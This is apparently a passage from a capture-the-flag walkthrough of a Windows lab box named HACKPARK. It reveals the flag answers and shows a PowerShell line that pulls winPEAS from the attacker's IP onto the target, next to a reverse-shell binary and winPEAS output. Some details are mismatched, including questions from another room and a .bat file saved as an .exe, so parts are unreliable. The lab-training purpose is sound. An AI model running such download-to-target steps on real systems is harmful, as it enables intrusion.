meterpreter > cat root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
```
Using this abnormal service, escalate your privileges!
What is the user flag (on Jeffs Desktop)?
Check exploit-db.com for a public writeup of this vulnerability. The missing binary isn't the same as the public exploit.
*759bd8af507517bcfaede78a21a73e39*
What is the root flag?
*7e13d97f05f7ceb9881a3eb3d78d3e72*
![](https://i.imgur.com/yYRoCAf.png)
In this task we will escalate our privileges without the use of meterpreter/metasploit!
Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.
```text

```
```text
┌──(kali㉿kali)-[~]
└─$ locate winpeas
```
```text
┌──(kali㉿kali)-[~]
└─$ locate winPEAS
/home/kali/Downloads/Enterprise/winPEASany_ofs.exe
/home/kali/Downloads/steel_mountain/winPEASany_ofs.exe
/usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-winPEAS.ps1
/usr/share/powershell-empire/empire/server/modules/powershell/privesc/winPEAS.yaml
```
```text
┌──(kali㉿kali)-[~]
└─$ cd /home/kali/Downloads/hackpark
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
--2022-09-27 14:33:26--  https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 35292 (34K) [text/plain]
Saving to: ‘winPEAS.bat’

winPEAS.bat                  100%[===========================================>]  34.46K  --.-KB/s    in 0.002s  

2022-09-27 14:33:26 (20.7 MB/s) - ‘winPEAS.bat’ saved [35292/35292]
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ ls            
Message.exe  revshell.exe  winPEAS.bat
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winpeas.exe'"
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.97.210 - - [27/Sep/2022 14:40:58] "GET /winPEAS.bat HTTP/1.1" 200 -

.\winpeas.exe                                                                                                    
     ,/*,..*(((((((((((((((((((((((((((((((((,                                                                   
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*                                                                
PowerShell v2 Version:                                                                                           
                                                                                                                 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine                                              
    PowerShellVersion    REG_SZ    2.0                                                                           
                                                                                                                 
PowerShell v5 Version:                                                                                           
                                                                                                                 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine                                              
    PowerShellVersion    REG_SZ    4.0                                                                           
                                                                                                                 
Transcriptions Settings:                                                                                         
Module logging settings:                                                                                         
Scriptblog logging settings:                                                                                     
                                                                                                                 
PS default transcript history                                                                                    
                                                                                                                 
Checking PS history file                                                                                         
                                                                                                                 
 [+] MOUNTED DISKS                                                                                               
   [i] Maybe you find something interesting                                                                      
Caption                                                                                                          
C:                                                                                                               
                                                                                                                 
                                                                                                                 
                                                                                                                 
 [+] ENVIRONMENT                                                                                                 
   [i] Interesting information?                                                                                  
                                                                                                                 
ALLUSERSPROFILE=C:\ProgramData                                                                                   
APPDATA=C:\Users\Administrator\AppData\Roaming                                                                   
CommonProgramFiles=C:\Program Files (x86)\Common Files                                                           
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files                                                      
CommonProgramW6432=C:\Program Files\Common Files                                                                 
COMPUTERNAME=HACKPARK                                                                                            
ComSpec=C:\Windows\system32\cmd.exe                                                                              
CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT                                                                     
E=0x1B[                                                                                                          
FP_NO_HOST_CHECK=NO                                                                                              
HOMEDRIVE=C:                                                                                                     
HOMEPATH=\Users\Administrator                                                                                    
LOCALAPPDATA=C:\Users\Administrator\AppData\Local                                                                
LOGONSERVER=\\HACKPARK                                                                                           
long=false                                                                                                       
NUMBER_OF_PROCESSORS=2                                                                                           
OS=Windows_NT                                                                                                    
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\         
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC                                                    
Percentage=1                                                                                                     
PercentageTrack=30                                                                                               
PROCESSOR_ARCHITECTURE=x86                                                                                       
PROCESSOR_ARCHITEW6432=AMD64                                                                                     
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 63 Stepping 2, GenuineIntel                                          
PROCESSOR_LEVEL=6                                                                                                
PROCESSOR_REVISION=3f02                                                                                          
ProgramData=C:\ProgramData                                                                                       
ProgramFiles=C:\Program Files (x86)                                                                              
ProgramFiles(x86)=C:\Program Files (x86)                                                                         
ProgramW6432=C:\Program Files                                                                                    
PROMPT=$P$G                                                                                                      
PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\                                                 
PUBLIC=C:\Users\Public                                                                                           
SESSIONNAME=Console                                                                                              
SystemDrive=C:                                                                                                   
SystemRoot=C:\Windows                                                                                            
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1                                                                      
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1                                                                       
USERDOMAIN=HACKPARK                                                                                              
USERDOMAIN_ROAMINGPROFILE=HACKPARK                                                                               
USERNAME=Administrator                                                                                           
USERPROFILE=C:\Users\Administrator                                                                               
windir=C:\Windows                                                                                                
